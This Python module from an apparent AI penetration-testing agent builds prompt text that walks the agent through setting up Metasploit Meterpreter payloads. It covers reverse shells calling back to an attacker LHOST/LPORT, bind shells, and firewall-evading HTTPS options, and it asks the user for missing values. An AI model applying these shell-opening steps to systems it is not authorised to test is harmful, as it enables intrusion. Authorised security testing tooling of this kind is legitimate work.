"""
RedAmon Agent Utility Functions

Utility functions for API and prompts that are not orchestrator-specific.
Orchestrator-specific helpers are in orchestrator_helpers/.
"""

from project_settings import get_setting
from orchestrator_helpers import get_checkpointer


def get_session_count() -> int:
    """Get total number of active sessions."""
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def get_session_config_prompt() -> str:
    """
    Generate a prompt section with pre-configured payload settings.

    Decision Logic:
        IF LPORT is set (not None, > 0):
            → Use REVERSE payload (target connects TO attacker)
            → Requires: LHOST + LPORT
        ELSE:
            → Use BIND payload (attacker connects TO target)
            → Requires: BIND_PORT_ON_TARGET (becomes LPORT in Metasploit)

    Returns:
        Formatted string with Metasploit commands for the agent.
    """
    # Fetch settings: empty string / None = "not set"
    LHOST = get_setting('LHOST', '') or None
    LPORT = get_setting('LPORT')
    BIND_PORT_ON_TARGET = get_setting('BIND_PORT_ON_TARGET', 4444)
    PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)

    # -------------------------------------------------------------------------
    # CHECK FOR MISSING PARAMETERS
    # -------------------------------------------------------------------------
    use_reverse = LPORT is not None and LPORT > 0
    use_bind = not use_reverse and BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    missing_params = []

    if use_reverse:
        # REVERSE mode: need LHOST and LPORT
        if not LHOST:
            missing_params.append(("LHOST", "Your attacker IP address (e.g., 172.28.0.2, 10.10.14.5)"))
        # LPORT is already set (that's why use_reverse is True)
    elif use_bind:
        # BIND mode: need BIND_PORT_ON_TARGET (already set)
        pass
    else:
        # Neither LPORT nor BIND_PORT_ON_TARGET is set - cannot proceed!
        missing_params.append(("LPORT or BIND_PORT_ON_TARGET", "Either set LPORT for reverse payload OR BIND_PORT_ON_TARGET for bind payload"))

    lines = []
    lines.append("### Pre-Configured Payload Settings")
    lines.append("")

    # -------------------------------------------------------------------------
    # HANDLE MISSING PARAMETERS - ASK USER
    # -------------------------------------------------------------------------
    if missing_params:
        lines.append("⚠️ **MISSING REQUIRED PARAMETERS - ASK USER BEFORE EXPLOITING!**")
        lines.append("")
        lines.append("The following parameters are not configured. You MUST ask the user:")
        lines.append("")
        for param, description in missing_params:
            lines.append(f"- **{param}**: {description}")
        lines.append("")
        lines.append("Use `action: \"ask_user\"` to request these values before proceeding.")
        lines.append("")
        lines.append("---")
        lines.append("")

    # -------------------------------------------------------------------------
    # SHOW CONFIGURED MODE
    # -------------------------------------------------------------------------
    if use_reverse:
        # =====================================================================
        # REVERSE PAYLOAD: Target connects TO attacker (LHOST:LPORT)
        # =====================================================================
        lhost_display = LHOST if LHOST else "<ASK USER>"

        lines.append("**Mode: REVERSE** (target connects to you)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│   TARGET    │ ───connects to───► │  ATTACKER   │")
        lines.append(f"│             │                    │ {lhost_display}:{LPORT} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")

        # Determine connection type based on PAYLOAD_USE_HTTPS
        if PAYLOAD_USE_HTTPS:
            conn_type = "reverse_https"
            reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
        else:
            conn_type = "reverse_tcp"
            reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

        lines.append(f"**Payload type:** `{conn_type}` ({reason})")
        lines.append("")
        lines.append("**IMPORTANT: You MUST first set TARGET to Dropper/Staged!**")
        lines.append("```")
        lines.append("show targets")
        lines.append("set TARGET 0   # Choose 'Automatic (Dropper)' or similar")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter reverse payload from `show payloads`:**")
        lines.append("")
        lines.append(f"Look for payloads with `meterpreter/{conn_type}` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append(f"- `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)")
        lines.append(f"- `linux/*/meterpreter/{conn_type}` for Linux native binaries")
        lines.append(f"- `windows/*/meterpreter/{conn_type}` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
        if LHOST:
            lines.append(f"set LHOST {LHOST}")
        else:
            lines.append("set LHOST <ASK USER FOR IP>")
        lines.append(f"set LPORT {LPORT}")
        lines.append("```")
        lines.append("")
        lines.append("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")

    elif use_bind:
        # =====================================================================
        # BIND PAYLOAD: Attacker connects TO target (RHOST:BIND_PORT)
        # =====================================================================
        lines.append("**Mode: BIND** (you connect to target)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│  ATTACKER   │ ───connects to───► │   TARGET    │")
        lines.append(f"│    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter bind payload from `show payloads`:**")
        lines.append("")
        lines.append("Look for payloads with `meterpreter/bind_tcp` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append("- `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)")
        lines.append("- `linux/*/meterpreter/bind_tcp` for Linux native binaries")
        lines.append("- `windows/*/meterpreter/bind_tcp` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
        lines.append(f"set LPORT {BIND_PORT_ON_TARGET}")
        lines.append("```")
        lines.append("")
        lines.append("**Note:** NO LHOST needed for bind payloads!")
        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for connection.")

    else:
        # =====================================================================
        # NO MODE CONFIGURED - CRITICAL ERROR
        # =====================================================================
        lines.append("❌ **NO PAYLOAD MODE CONFIGURED**")
        lines.append("")
        lines.append("Neither LPORT nor BIND_PORT_ON_TARGET is set in project settings.")
        lines.append("")
        lines.append("**Ask the user which mode to use:**")
        lines.append("")
        lines.append("1. **REVERSE** (target connects to you):")
        lines.append("   - Ask: \"What is your attacker IP (LHOST)?\"")
        lines.append("   - Ask: \"What port should I listen on (LPORT)? Default: 4444\"")
        lines.append("")
        lines.append("2. **BIND** (you connect to target):")
        lines.append("   - Ask: \"What port should the target open (BIND_PORT)? Default: 4444\"")
        lines.append("")
        lines.append("Use `action: \"ask_user\"` to gather this information.")

    lines.append("")
    lines.append("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)
